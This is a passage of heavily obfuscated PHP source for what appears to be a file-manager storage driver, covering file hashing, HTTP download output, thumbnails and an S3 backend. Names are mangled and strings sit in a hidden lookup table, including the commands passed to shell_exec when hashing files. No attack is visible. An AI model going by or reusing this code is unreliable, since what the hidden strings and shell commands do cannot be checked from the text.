$ú–æ¾ * $‘Ìê´À) { return $this->hashMd5($³Â‹ã´©) . $²†ÒáĞ; } $ü¸®Â½† = intval($²†ÒáĞ / $‘Ìê´À); $ÃùÜÜ£ = $¡•ÏÔ Ğ[12]; for ($¦áŸÆ = 0; $¦áŸÆ < $‘Ìê´À; $¦áŸÆ++) { $ÃùÜÜ£ .= $this->fileSubstr($³Â‹ã´©, $ü¸®Â½† * $¦áŸÆ, $ú–æ¾); } $ÃùÜÜ£ .= $this->fileSubstr($³Â‹ã´©, $²†ÒáĞ - $ú–æ¾, $ú–æ¾); return md5($ÃùÜÜ£) . $²†ÒáĞ; } public static $md5Cache = array(); public function hashMd5($·Ø¡ÆÀ×) { if (!$·Ø¡ÆÀ×) { return md5($_SERVER[ĞÂ¤àÓï][12]); } $·Ø¡ÆÀ× = $this->iconvSystem($·Ø¡ÆÀ×); if (isset(self::$md5Cache[$·Ø¡ÆÀ×])) { return self::$md5Cache[$·Ø¡ÆÀ×]; } self::$md5Cache[$·Ø¡ÆÀ×] = $this->hashMd5Shell($·Ø¡ÆÀ×); if (!self::$md5Cache[$·Ø¡ÆÀ×]) { self::$md5Cache[$·Ø¡ÆÀ×] = @md5_file($·Ø¡ÆÀ×); } return self::$md5Cache[$·Ø¡ÆÀ×]; } private function hashMd5Shell($éŠîĞ¶¸) { $¤¹´€¨‰ =& $_SERVER[ĞÂ¤àÓï]; if (!$éŠîĞ¶¸) { return md5($¤¹´€¨‰[12]); } if (!function_exists($¤¹´€¨‰[98])) { return !1; } $´ÓÊ˜È¨ = array($¤¹´€¨‰[99], $¤¹´€¨‰[100]); $ĞÈáÏ¸· = Cache::get($¤¹´€¨‰[101]); if (!$ĞÈáÏ¸·) { $â¤äïÑÃ = BASIC_PATH . $¤¹´€¨‰[102]; $‡ƒÓ›øª = md5_file($â¤äïÑÃ); $ĞÈáÏ¸· = $¤¹´€¨‰[103]; foreach ($´ÓÊ˜È¨ as $Ã°ıüÒ‹) { $‡áŞ›×Ê = shell_exec($Ã°ıüÒ‹ . "\x20\x22{$â¤äïÑÃ}\42"); if ($‡áŞ›×Ê && substr(trim($‡áŞ›×Ê), 0, 32) == $‡ƒÓ›øª) { $ĞÈáÏ¸· = $Ã°ıüÒ‹; break; } } Cache::set($¤¹´€¨‰[101], $ĞÈáÏ¸·, 3600); } if ($ĞÈáÏ¸· == $¤¹´€¨‰[103]) { return !1; } $‡áŞ›×Ê = shell_exec($ĞÈáÏ¸· . "\40\x22{$éŠîĞ¶¸}\42"); $‡áŞ›×Ê = str_replace($¤¹´€¨‰[104], $¤¹´€¨‰[12], $‡áŞ›×Ê); return substr($‡áŞ›×Ê, 0, 32); } public function link($ûäÍçæ—) { return $ûäÍçæ—; } public function fileOut($š¯Œ°™, $Ö‡¤Š¡ê = false, $ßåÃçí™ = false, $ıˆ¯«—Æ = '') { $Ÿİøµ¡ =& $_SERVER[ĞÂ¤àÓï]; $this->cacheMethod(null, null); if (!$š¯Œ°™ || !$this->exist($š¯Œ°™)) { show_json(LNG($Ÿİøµ¡[105]), !1, $ßåÃçí™); } $”é¯çÕ‹ = $this->getType() == $Ÿİøµ¡[106]; $Ûİ¤Óáû = $GLOBALS[$Ÿİøµ¡[6]][$Ÿİøµ¡[89]][$Ÿİøµ¡[107]][$Ÿİøµ¡[108]]; $ºêœõÙ‡ = (double) $GLOBALS[$Ÿİøµ¡[6]][$Ÿİøµ¡[89]][$Ÿİøµ¡[107]][$Ÿİøµ¡[109]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $¼Â¨éà¤ = $this->infoFull($š¯Œ°™); $¢™îÈú = $¼Â¨éà¤[$Ÿİøµ¡[76]]; $©†Ï®õù = gmdate($Ÿİøµ¡[110], $¼Â¨éà¤[$Ÿİøµ¡[85]]); $÷¹ú£ñÄ = $ßåÃçí™ ? $ßåÃçí™ : $this->iconvApp($¼Â¨éà¤[$Ÿİøµ¡[32]]); $ÓÑß ó› = 0; $–ÉÖïÏ® = $¢™îÈú - 1; $†ö·ßæŒ = $this->ext($÷¹ú£ñÄ); if (in_array($†ö·ßæŒ, array($Ÿİøµ¡[111], $Ÿİøµ¡[112], $Ÿİøµ¡[113], $Ÿİøµ¡[114]))) { $†ö·ßæŒ = $Ÿİøµ¡[115]; } if (in_array($†ö·ßæŒ, array($Ÿİøµ¡[116]))) { $†ö·ßæŒ = $Ÿİøµ¡[117]; } if (!$ıˆ¯«—Æ) { $ıˆ¯«—Æ = md5($©†Ï®õù . $this->hashSimple($š¯Œ°™)); } $ıˆ¯«—Æ = $Ÿİøµ¡[118] . $ıˆ¯«—Æ . $Ÿİøµ¡[118]; $‰ÇûÆÄ = get_file_mime($†ö·ßæŒ); $¶‰€óÙÄ = !0; $¶‰€óÙÄ = isset($_GET[$Ÿİøµ¡[119]]) ? !1 : !0; if ($Ö‡¤Š¡ê === !1 && !mime_support($‰ÇûÆÄ)) { $‰ÇûÆÄ = $Ÿİøµ¡[120]; } header($Ÿİøµ¡[121]); header($Ÿİøµ¡[122] . $‰ÇûÆÄ); $ÀßÃşÈ = rawurlencode($÷¹ú£ñÄ); $ÀßÃşÈ = $Ÿİøµ¡[118] . $ÀßÃşÈ . $Ÿİøµ¡[123] . $ÀßÃşÈ; if ($Ö‡¤Š¡ê) { header($Ÿİøµ¡[124]); header($Ÿİøµ¡[125] . $ÀßÃşÈ); } else { if ($¶‰€óÙÄ) { header($Ÿİøµ¡[126] . $ÀßÃşÈ); } } header($Ÿİøµ¡[127] . gmdate($Ÿİøµ¡[110], time() + 3600 * 24 * 30) . $Ÿİøµ¡[128]); header($Ÿİøµ¡[129]); header($Ÿİøµ¡[130]); header($Ÿİøµ¡[131]); if (isset($_SERVER[$Ÿİøµ¡[132]]) && strtotime($_SERVER[$Ÿİøµ¡[132]]) == $¼Â¨éà¤[$Ÿİøµ¡[85]]) { header($Ÿİøµ¡[133], !0, 304); die; } if (isset($_SERVER[$Ÿİøµ¡[134]]) && $_SERVER[$Ÿİøµ¡[134]] == $ıˆ¯«—Æ) { header($Ÿİøµ¡[135] . $ıˆ¯«—Æ, !0, 304); die; } header($Ÿİøµ¡[135] . $ıˆ¯«—Æ); header($Ÿİøµ¡[136] . $©†Ï®õù . $Ÿİøµ¡[128]); header($Ÿİøµ¡[137] . $÷¹ú£ñÄ); header($Ÿİøµ¡[138]); header($Ÿİøµ¡[139] . $¢™îÈú); header($Ÿİøµ¡[140]); if (!$Ö‡¤Š¡ê && $†ö·ßæŒ == $Ÿİøµ¡[141]) { if ($¢™îÈú > 1024 * 1024 * 5) { die; } $çÒÑáÒÂ = $this->getContent($š¯Œ°™); $çÒÑáÒÂ = Html::clearSVG($çÒÑáÒÂ); header($Ÿİøµ¡[142] . strlen($çÒÑáÒÂ)); echo $çÒÑáÒÂ; die; } $Äåª•Ä´ = strtolower($_SERVER[$Ÿİøµ¡[143]]); if ($”é¯çÕ‹ && $Äåª•Ä´ && $Ûİ¤Óáû) { if (strstr($Äåª•Ä´, $Ÿİøµ¡[144])) { header($Ÿİøµ¡[145] . $š¯Œ°™); } else { if (strstr($Äåª•Ä´, $Ÿİøµ¡[146])) { header($Ÿİøµ¡[147] . $š¯Œ°™); } else { if (strstr($Äåª•Ä´, $Ÿİøµ¡[148])) { header($Ÿİøµ¡[149] . $š¯Œ°™); } } } if ($ºêœõÙ‡) { header($Ÿİøµ¡[150] . $ºêœõÙ‡); } return; } if (isset($_SERVER[$Ÿİøµ¡[151]])) { if (preg_match($Ÿİøµ¡[152], $_SERVER[$Ÿİøµ¡[151]], $õ’Ç¾ıö)) { $ÓÑß ó› = intval($õ’Ç¾ıö[1]); $ÓÑß ó› = $ÓÑß ó› <= 0 ? 0 : ($ÓÑß ó› >= $–ÉÖïÏ® ? $–ÉÖïÏ® : $ÓÑß ó›); if (!empty($õ’Ç¾ıö[2])) { $‹ƒ—Â‡ = intval($õ’Ç¾ıö[2]); $–ÉÖïÏ® = $‹ƒ—Â‡ < $ÓÑß ó› ? $ÓÑß ó› : ($‹ƒ—Â‡ >= $–ÉÖïÏ® ? $–ÉÖïÏ® : $‹ƒ—Â‡); } } header($Ÿİøµ¡[153]); header("\x43\x6f\156\164\145\156\x74\x2d\x52\141\156\147\145\72\40\x62\171\164\x65\x73\40{$ÓÑß ó›}\x2d{$–ÉÖïÏ®}\x2f" . $¢™îÈú); } else { header($Ÿİøµ¡[154]); } header($Ÿİøµ¡[155]); $ë…’úåÍ = !0; if ($_SERVER[$Ÿİøµ¡[156]] == $Ÿİøµ¡[157] && $¢™îÈú > 1204 * 1024 * 1024 * 2) { $ë…’úåÍ = !1; } if ($ë…’úåÍ) { header($Ÿİøµ¡[158] . ($–ÉÖïÏ® - $ÓÑß ó› + 1)); } if ($_SERVER[$Ÿİøµ¡[159]] == $Ÿİøµ¡[160]) { return; } $çğ”™Ò– = 1024 * 100; $ÛˆåÂÓ = 0; if ($ºêœõÙ‡) { $ÛˆåÂÓ = intval(1000 * 1000 * ($çğ”™Ò– / $ºêœõÙ‡)); } while ($ÓÑß ó› <= $–ÉÖïÏ®) { $õíƒµÕ‡ = timeFloat(); check_abort(); $æ³ª‹Œ¡ = $–ÉÖïÏ® - $ÓÑß ó› + 1; if ($æ³ª‹Œ¡ <= $çğ”™Ò–) { $çğ”™Ò– = $æ³ª‹Œ¡; } echo $this->fileSubstr($š¯Œ°™, $ÓÑß ó›, $çğ”™Ò–); $ÓÑß ó› += $çğ”™Ò–; if ($çğ”™Ò– == $æ³ª‹Œ¡) { $ÓÑß ó› = $–ÉÖïÏ® + 1; } if ($ÛˆåÂÓ) { $Œ‡­¥æğ = intval(1000 * 1000 * (timeFloat() - $õíƒµÕ‡)); $Ç·ïìğ = $ÛˆåÂÓ - $Œ‡­¥æğ; if ($Ç·ïìğ > 5) { usleep($Ç·ïìğ); } } } } public function fileOutServer($•Ç…ƒü, $«Ñ²Ş®Ê = false, $§ÍæËç™ = false, $şŒÔáˆ× = '') { $this->fileOut($•Ç…ƒü, $«Ñ²Ş®Ê, $§ÍæËç™, $şŒÔáˆ×); } public function fileOutLink($¸­ñ»†÷) { header($_SERVER[ĞÂ¤àÓï][161] . $¸­ñ»†÷); die; } public function cacheMethod($ôÑëÊé¢, $‡ä†²Ğ”, $ùÍ£àì€ = null) { $ãì¼”§… =& $_SERVER[ĞÂ¤àÓï]; static $÷• ±ÖÏ = array(); $²è“ôÉô = $‡ä†²Ğ” ? ltrim($this->getPathOuter($‡ä†²Ğ”), $ãì¼”§…[8]) : $ãì¼”§…[12]; $£ğÄÄ• = $ãì¼”§…[162] . $ôÑëÊé¢ . $ãì¼”§…[163] . rtrim($²è“ôÉô, $ãì¼”§…[8]); if (is_null($ôÑëÊé¢)) { $÷• ±ÖÏ = array(); return; } if (is_null($‡ä†²Ğ”)) { foreach ($÷• ±ÖÏ as $£ğÄÄ• => $˜±Ûµñ) { if (!strstr($£ğÄÄ•, $ãì¼”§…[162] . $ôÑëÊé¢ . $ãì¼”§…[164])) { continue; } unset($÷• ±ÖÏ[$£ğÄÄ•]); } return; } if (!is_null($ùÍ£àì€)) { $÷• ±ÖÏ[$£ğÄÄ•] = $ùÍ£àì€; return; } $İİú¢§§ = isset($÷• ±ÖÏ[$£ğÄÄ•]) ? $÷• ±ÖÏ[$£ğÄÄ•] : null; if (!is_null($İİú¢§§)) { return $İİú¢§§; } $İİú¢§§ = $this->{$ôÑëÊé¢}($‡ä†²Ğ”); $÷• ±ÖÏ[$£ğÄÄ•] = $İİú¢§§; return $İİú¢§§; } public function cacheMethodInfoSet($ˆöŠÓØ˜, $é‘½çÈ…, $¾ÀèˆÒ´ = false) { $ÓÀ£•Ô÷ =& $_SERVER[ĞÂ¤àÓï]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($ÓÀ£•Ô÷[165], $ˆöŠÓØ˜, $é‘½çÈ…); $this->cacheMethod($ÓÀ£•Ô÷[166], $ˆöŠÓØ˜, $é‘½çÈ… ? !1 : !0); if (is_array($¾ÀèˆÒ´)) { $this->cacheMethod($ÓÀ£•Ô÷[167], $ˆöŠÓØ˜, $¾ÀèˆÒ´); } } public function fileOutImage($½äµ©ÀØ, $³Îáûª  = 250) { $íá­ÈşÊ =& $_SERVER[ĞÂ¤àÓï]; set_timeout(); if (substr($½äµ©ÀØ, 0, 4) == $íá­ÈşÊ[148]) { $this->fileOutLink($½äµ©ÀØ); } $áÍ±”„ï = $this->info($½äµ©ÀØ); $åÑÛ‚ Ü = $áÍ±”„ï[$íá­ÈşÊ[32]]; $ÕÆ•œø = !1; if (isset($GLOBALS[$íá­ÈşÊ[168]]) && $GLOBALS[$íá­ÈşÊ[168]][$íá­ÈşÊ[84]] == $áÍ±”„ï[$íá­ÈşÊ[84]]) { $ò›Øª Å = $GLOBALS[$íá­ÈşÊ[168]][$íá­ÈşÊ[169]]; if (!$áÍ±”„ï[$íá­ÈşÊ[170]]) { $áÍ±”„ï[$íá­ÈşÊ[170]] = $GLOBALS[$íá­ÈşÊ[168]]; } if (isset($ò›Øª Å[$íá­ÈşÊ[171]])) { if ($ò›Øª Å[$íá­ÈşÊ[171]] <= $³Îáûª  && $ò›Øª Å[$íá­ÈşÊ[172]] <= $³Îáûª ) { $ÕÆ•œø = !0; } } $åÑÛ‚ Ü = $áÍ±”„ï[$íá­ÈşÊ[170]][$íá­ÈşÊ[32]]; } if ($áÍ±”„ï[$íá­ÈşÊ[76]] <= 1024 * 50 || $ÕÆ•œø || !function_exists($íá­ÈşÊ[173]) || $áÍ±”„ï[$íá­ÈşÊ[174]] == $íá­ÈşÊ[175]) { return $this->fileOut($½äµ©ÀØ, !1, $åÑÛ‚ Ü); } if (isset($áÍ±”„ï[$íá­ÈşÊ[170]][$íá­ÈşÊ[176]])) { $Î‘È“ºí = $áÍ±”„ï[$íá­ÈşÊ[170]][$íá­ÈşÊ[176]]; } else { if (isset($áÍ±”„ï[$íá­ÈşÊ[170]][$íá­ÈşÊ[177]])) { $Î‘È“ºí = $áÍ±”„ï[$íá­ÈşÊ[170]][$íá­ÈşÊ[177]]; } } if (!$Î‘È“ºí) { $Î‘È“ºí = md5("{$áÍ±”„ï[$íá­ÈşÊ[32]]}\137{$áÍ±”„ï[$íá­ÈşÊ[84]]}\137{$áÍ±”„ï[$íá­ÈşÊ[76]]}\137{$³Îáûª }"); } $™Í©»âî = "{$Î‘È“ºí}\x5f{$³Îáûª }\56\160\156\147"; if (!($£¡®’°¤ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $íá­ÈşÊ[178]))) { $ÉÕ¼¿Š¶ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $íá­ÈşÊ[179]); } else { $ÉÕ¼¿Š¶ = KodIO::make($£¡®’°¤); } if ($£¡®’°¤ = IO::fileNameExist($ÉÕ¼¿Š¶, $™Í©»âî)) { $«»ı›ù‘ = KodIO::make($£¡®’°¤); return IO::fileOut($«»ı›ù‘, !1, $åÑÛ‚ Ü); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $«»ı›ù‘ = DATA_THUMB . $™Í©»âî; del_file($«»ı›ù‘); if (!@file_exists($«»ı›ù‘)) { $«ù·Ï˜¶ = TEMP_FILES; if (!is_dir($«ù·Ï˜¶)) { mk_dir($«ù·Ï˜¶); } $‰¡õ¹Š = $«ù·Ï˜¶ . $Î‘È“ºí . $íá­ÈşÊ[10] . $áÍ±”„ï[$íá­ÈşÊ[174]]; if (!@file_exists($‰¡õ¹Š)) { $‰¡õ¹Š = $this->download($½äµ©ÀØ, $‰¡õ¹Š); } ImageThumb::createThumb($‰¡õ¹Š, $«»ı›ù‘, $³Îáûª , $³Îáûª  * 10); } if (!file_exists($«»ı›ù‘) || filesize($«»ı›ù‘) < 100) { return @file_exists($‰¡õ¹Š) ? IO::fileOut($‰¡õ¹Š) : $this->fileOut($½äµ©ÀØ); } if (!($µæÍ– û = IO::move($«»ı›ù‘, $ÉÕ¼¿Š¶))) { return IO::fileOut($«»ı›ù‘); } del_file($«»ı›ù‘); IO::fileOut($µæÍ– û); } public function fileOutImageServer($æ†©ÕÖ¤, $Û˜ùİ‰ = 250) { $this->fileOutImage($æ†©ÕÖ¤, $Û˜ùİ‰); } public function fileNameAuto($³òÑ‚“¨, $ÎˆÜ£¹¹, $óì˜‰ = REPEAT_RENAME, $¼ÚÓù“ = false) { $¦í¿—Âõ =& $_SERVER[ĞÂ¤àÓï]; $Ú ãéÎñ = $³òÑ‚“¨ === $¦í¿—Âõ[12] ? $ÎˆÜ£¹¹ : rtrim($³òÑ‚“¨, $¦í¿—Âõ[8]) . $¦í¿—Âõ[8] . $ÎˆÜ£¹¹; if ($óì˜‰ == REPEAT_REPLACE || !$this->exist($Ú ãéÎñ) || $¼ÚÓù“ && $óì˜‰ != REPEAT_RENAME_FOLDER) { return $ÎˆÜ£¹¹; } if ($óì˜‰ == REPEAT_SKIP) { return !1; } $Œ…‰Ù”µ = $¦í¿—Âõ[10] . get_path_ext($ÎˆÜ£¹¹); $Œ…‰Ù”µ = $Œ…‰Ù”µ == $¦í¿—Âõ[10] || $¼ÚÓù“ ? $¦í¿—Âõ[12] : $Œ…‰Ù”µ; $ÅÇıšó´ = 1; $çìÎù¤‰ = substr($ÎˆÜ£¹¹, 0, strlen($ÎˆÜ£¹¹) - strlen($Œ…‰Ù”µ)); $„ú”ÙóÌ = $çìÎù¤‰ . "\50{$ÅÇıšó´}\x29{$Œ…‰Ù”µ}"; while ($this->exist(rtrim($³òÑ‚“¨, $¦í¿—Âõ[8]) . $¦í¿—Âõ[8] . $„ú”ÙóÌ)) { $„ú”ÙóÌ = $çìÎù¤‰ . "\x28{$ÅÇıšó´}\51{$Œ…‰Ù”µ}"; $ÅÇıšó´++; } return $„ú”ÙóÌ; } private function fileNameAutoList($­¼ÏÍ™Æ, $¹¢Ô¤°·, $’´¾å‚ = false) { $†³Î£üÇ =& $_SERVER[ĞÂ¤àÓï]; $€è«½¥ = $this->listPath($­¼ÏÍ™Æ, !0); $€è«½¥ = array_merge($€è«½¥[$†³Î£üÇ[82]], $€è«½¥[$†³Î£üÇ[83]]); $ûÆãñà = array_to_keyvalue($€è«½¥, $†³Î£üÇ[12], $†³Î£üÇ[32]); $ÕşÆëØ = $†³Î£üÇ[10] . get_path_ext($¹¢Ô¤°·); $ÕşÆëØ = $ÕşÆëØ == $†³Î£üÇ[10] || $’´¾å‚ ? $†³Î£üÇ[12] : $ÕşÆëØ; $Ğ”Ú—ü = substr($¹¢Ô¤°·, 0, strlen($¹¢Ô¤°·) - strlen($ÕşÆëØ)); $ ÙÍüÓ¢ = $Ğ”Ú—ü . "\x28\60\51{$ÕşÆëØ}"; for ($”Œ’¨Û = 1; $”Œ’¨Û <= count($ûÆãñà) + 1; $”Œ’¨Û++) { $ ÙÍüÓ¢ = $Ğ”Ú—ü . "\x28{$”Œ’¨Û}\51{$ÕşÆëØ}"; if (!in_array_not_case($ ÙÍüÓ¢, $ûÆãñà)) { return $ ÙÍüÓ¢; } } return $ ÙÍüÓ¢; } public function listAllFiles($šŸú´Ïå, $¸…ôé‹Û, $¸€­ˆÎ– = array()) { $ŸÔ–¤» =& $_SERVER[ĞÂ¤àÓï]; if (empty($¸…ôé‹Û)) { return array(); } $ÆßË°ñ± = array(); $šŸú´Ïå = trim($šŸú´Ïå, $ŸÔ–¤»[8]); foreach ($¸…ôé‹Û as $ƒäÖ½ì) { $»òú‚† = ltrim(substr(trim($ƒäÖ½ì, $ŸÔ–¤»[8]), strlen($šŸú´Ïå)), $ŸÔ–¤»[8]); $ÆßË°ñ± = array_merge($ÆßË°ñ±, $this->slicePath($»òú‚†)); } $ñ–Éç—î = array(); foreach (array_unique($ÆßË°ñ±) as $ƒäÖ½ì) { $Ìä‰Ù¨ = array($ŸÔ–¤»[84] => $this->getPathOuter($ŸÔ–¤»[8] . $šŸú´Ïå . $ŸÔ–¤»[8] . $ƒäÖ½ì), $ŸÔ–¤»[75] => 1, $ŸÔ–¤»[76] => 0); if (substr($ƒäÖ½ì, -1) != $ŸÔ–¤»[8]) { $Ìä‰Ù¨[$ŸÔ–¤»[75]] = 0; $¦ÁàĞÈ˜ = $this->getPath($šŸú´Ïå . $ŸÔ–¤»[8] . $ƒäÖ½ì); $Ìä‰Ù¨[$ŸÔ–¤»[76]] = isset($¸€­ˆÎ–[$¦ÁàĞÈ˜]) ? $¸€­ˆÎ–[$¦ÁàĞÈ˜] : $this->size($¦ÁàĞÈ˜); } $ñ–Éç—î[] = $Ìä‰Ù¨; } return $ñ–Éç—î; } public function slicePath($áê¿ä•Á) { $Û€«´¡ =& $_SERVER[ĞÂ¤àÓï]; $®„‚µ–õ = explode($Û€«´¡[8], trim($áê¿ä•Á, $Û€«´¡[8])); $ƒøãşí£ = 0; do { ++$ƒøãşí£; $ËğÅĞˆ[] = implode($Û€«´¡[8], array_slice($®„‚µ–õ, 0, $ƒøãşí£)) . $Û€«´¡[8]; } while ($ƒøãşí£ < count($®„‚µ–õ)); $ËğÅĞˆ[count($®„‚µ–õ) - 1] = $áê¿ä•Á; return $ËğÅĞˆ; } public function getHost() { $¤°óˆë½ =& $_SERVER[ĞÂ¤àÓï]; $Ç‚‹€Âª = parse_url(trim($this->domain, $¤°óˆë½[8])); $òšÑù© = isset($Ç‚‹€Âª[$¤°óˆë½[180]]) ? $Ç‚‹€Âª[$¤°óˆë½[180]] : http_type(); $Âœ±ôĞâ = isset($Ç‚‹€Âª[$¤°óˆë½[181]]) ? $Ç‚‹€Âª[$¤°óˆë½[181]] : $Ç‚‹€Âª[$¤°óˆë½[84]]; if (isset($Ç‚‹€Âª[$¤°óˆë½[182]])) { $Âœ±ôĞâ .= $¤°óˆë½[4] . $Ç‚‹€Âª[$¤°óˆë½[182]]; } return $òšÑù© . $¤°óˆë½[183] . $Âœ±ôĞâ; } public function pathEncode($”ûŸçÓÕ) { $ï—©÷º× =& $_SERVER[ĞÂ¤àÓï]; return str_replace($ï—©÷º×[184], $ï—©÷º×[8], rawurlencode($”ûŸçÓÕ)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\64"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public function __construct($Ç·½Àüü) { set_timeout(); require_once SDK_DIR . $_SERVER[ĞÂ¤àÓï][185]; parent::__construct(); $this->_init($Ç·½Àüü); } public function _init($¹²Ãó®) { foreach ($¹²Ãó® as $ÖëÅè¦• => $×¾èÅîó) { if (isset($this->{$ÖëÅè¦•})) { $this->{$ÖëÅè¦•} = $×¾èÅîó; } } $this->endpoint = $¹²Ãó®[$_SERVER[ĞÂ¤àÓï][186]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($âÌûó€Ş = "\166\64") { $this->signVer = $âÌûó€Ş; $this->client->setSignatureVersion($âÌûó€Ş); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $›Ú†ØÀ¹ =& $_SERVER[ĞÂ¤àÓï]; $ÀİÅıî± = $this->getBucketCors(); if (!$ÀİÅıî± || !is_array($ÀİÅıî±)) { return !1; } if ($ÀİÅıî±[$›Ú†ØÀ¹[187]] != $›Ú†ØÀ¹[188] || $ÀİÅıî±[$›Ú†ØÀ¹[189]] != $›Ú†ØÀ¹[188]) { return !1; } $åÛ”Œ±ª = array_map($›Ú†ØÀ¹[190], $ÀİÅıî±[$›Ú†ØÀ¹[191]]); if (!is_array($åÛ”Œ±ª)) { $åÛ”Œ±ª = array(); } $—€ü¸œÜ = array($›Ú†ØÀ¹[192], $›Ú†ØÀ¹[193], $›Ú†ØÀ¹[194], $›Ú†ØÀ¹[195], $›Ú†ØÀ¹[196]); $ù°«áºÂ = array_diff($—€ü¸œÜ, $åÛ”Œ±ª); return empty($ù°«áºÂ); } public function mkfile($æ€ü«½, $¶Ìğ„™ö = '', $¯ŞïÔ§ = REPEAT_RENAME) { $¾ğÜ…€× = $this->setContent($æ€ü«½, $¶Ìğ„™ö); if ($¾ğÜ…€× !== !1) { return $this->getPathOuter($æ€ü«½); } return !1; } public function mkdir($¬ÁÑ¤, $©ì©ªâ» = REPEAT_SKIP) { $¼µõ©‰ñ =& $_SERVER[ĞÂ¤àÓï]; if (empty($¬ÁÑ¤) && $¬ÁÑ¤ !== $¼µõ©‰ñ[197]) { return !1; } if ($©ì©ªâ» && $this->_isFolder($¬ÁÑ¤)) { return $this->getPathOuter($¬ÁÑ¤); } $ü”™òì = $this->setContent($¬ÁÑ¤, $¼µõ©‰ñ[12], !0); if ($ü”™òì !== !1) { return $this->getPathOuter($¬ÁÑ¤); } return !1; } public function copyFile($¬ÃÆËºÕ, $¥ıøÚ , $¶º°Êå¡ = array()) { $Äº˜™‡» =& $_SERVER[ĞÂ¤àÓï]; $åÄâª¸• = $this->objectMeta($¬ÃÆËºÕ); if (!$åÄâª¸•) { return !1; } if ($åÄâª¸•[$Äº˜™‡»[76]] <= 1024 * 1024 * 200) { $¤­Å®Ü¥ = $this->client->copyObject($this->bucket, $¬ÃÆËºÕ, $this->bucket, $¥ıøÚ , $Äº˜™‡»[198], $¶º°Êå¡); } else { $¤­Å®Ü¥ = $this->client->multiCopyObject($this->bucket, $¬ÃÆËºÕ, $this->bucket, $¥ıøÚ , $¶º°Êå¡); } $¤­Å®Ü¥ = $¤­Å®Ü¥ ? $this->getPathOuter($¥ıøÚ ) : !1; return $¤­Å®Ü¥; } public function moveFile($¨½º¹, $µ—¦à“) { if ($this->copyFile($¨½º¹, $µ—¦à“)) { $this->delFile($¨½º¹); return $this->getPathOuter($µ—¦à“); } return !1; } public function delFile($Ë«ïÅí) { return $this->client->deleteObject($this->bucket, $Ë«ïÅí); } public function delFolder($ÜéöØ¬) { $îÓãšõï =& $_SERVER[ĞÂ¤àÓï]; if (!$this->exist($ÜéöØ¬)) { return !0; } $this->listItemCache = !1; $²„—·¦„ = $this->fileList($ÜéöØ¬); $this->listItemCache = !0; $ÈĞ·ù­ù = trim($ÜéöØ¬, $îÓãšõï[8]) . $îÓãšõï[8]; if (!empty($ÜéöØ¬) && $ÜéöØ¬ !== $îÓãšõï[197] && !in_array($ÈĞ·ù­ù, $²„—·¦„[$îÓãšõï[82]])) { $²„—·¦„[$îÓãšõï[82]][] = $ÈĞ·ù­ù; } $µù¨ïÚü = $this->delByBatch($²„—·¦„[$îÓãšõï[83]]); if (!$µù¨ïÚü) { return !1; } $µù¨ïÚü = $this->delByBatch($²„—·¦„[$îÓãšõï[82]]); if (!$µù¨ïÚü) { return !1; } return $this->delFile($ÈĞ·ù­ù); } private function delByBatch($úØñÍ•”) { foreach (array_chunk($úØñÍ•”, 1000) as $¨Ô®§‘) { $Å‰„¬ß = $this->client->deleteObjects($this->bucket, $¨Ô®§‘); if (!$Å‰„¬ß) { return !1; } } return !0; } public function rename($¬Ş¿¦ıŞ, $º¸ïşå) { return $this->renameObject($¬Ş¿¦ıŞ, $º¸ïşå); } public function listPath($¼Ñ±‚û, $æİìûÓÑ = false) { $±”„„° =& $_SERVER[ĞÂ¤àÓï]; $Ï“ñ‡® = $this->fileList($¼Ñ±‚û, $±”„„°[8], !0); foreach ($Ï“ñ‡®[$±”„„°[82]] as $³ ö…°è => $°øÈÕ¦™) { $Ï“ñ‡®[$±”„„°[82]][$³ ö…°è] = $this->folderInfo($°øÈÕ¦™, $æİìûÓÑ, $°øÈÕ¦™); } foreach ($Ï“ñ‡®[$±”„„°[83]] as $³ ö…°è => $°øÈÕ¦™) { $Ï“ñ‡®[$±”„„°[83]][$³ ö…°è] = $this->fileInfo($°øÈÕ¦™[$±”„„°[32]], $æİìûÓÑ, $°øÈÕ¦™); } return $Ï“ñ‡®; } protected function infoChildren($€ì‰­ºÇ, &$îÜÙ‹’ø) { $Ğ†ìîØ¸ =& $_SERVER[ĞÂ¤àÓï]; $çÂúÆ§ = $this->fileList($€ì‰­ºÇ, $Ğ†ìîØ¸[12], !0); $îÜÙ‹’ø[$Ğ†ìîØ¸[78]] += count($çÂúÆ§[$Ğ†ìîØ¸[82]]); $îÜÙ‹’ø[$Ğ†ìîØ¸[77]] += count($çÂúÆ§[$Ğ†ìîØ¸[83]]); foreach ($çÂúÆ§[$Ğ†ìîØ¸[83]] as $¿“•ëõÒ) { if (!$¿“•ëõÒ || !$¿“•ëõÒ[$Ğ†ìîØ¸[76]]) { continue; } $îÜÙ‹’ø[$Ğ†ìîØ¸[76]] += $¿“•ëõÒ[$Ğ†ìîØ¸[76]]; } } private function fileInfo($É…„Óæú, $¼„øºµ“ = false, $Éı‰…£´ = array()) { $Ÿ¾¸À€¦ =& $_SERVER[ĞÂ¤àÓï]; $Í½Ş²ºÛ = array($Ÿ¾¸À€¦[32] => $this->pathThis($É…„Óæú), $Ÿ¾¸À€¦[84] => $this->getPathOuter($É…„Óæú), $Ÿ¾¸À€¦[33] => $Ÿ¾¸À€¦[199], $Ÿ¾¸À€¦[174] => $this->ext($É…„Óæú), $Ÿ¾¸À€¦[76] => isset($Éı‰…£´[$Ÿ¾¸À€¦[76]]) ? $Éı‰…£´[$Ÿ¾¸À€¦[76]] : 0); if ($¼„øºµ“) { return $Í½Ş²ºÛ; } $Í½Ş²ºÛ[$Ÿ¾¸À€¦[200]] = $Í½Ş²ºÛ[$Ÿ¾¸À€¦[85]] = 0; $Í½Ş²ºÛ[$Ÿ¾¸À€¦[201]] = $Í½Ş²ºÛ[$Ÿ¾¸À€¦[202]] = !0; if (empty($Éı‰…£´)) { 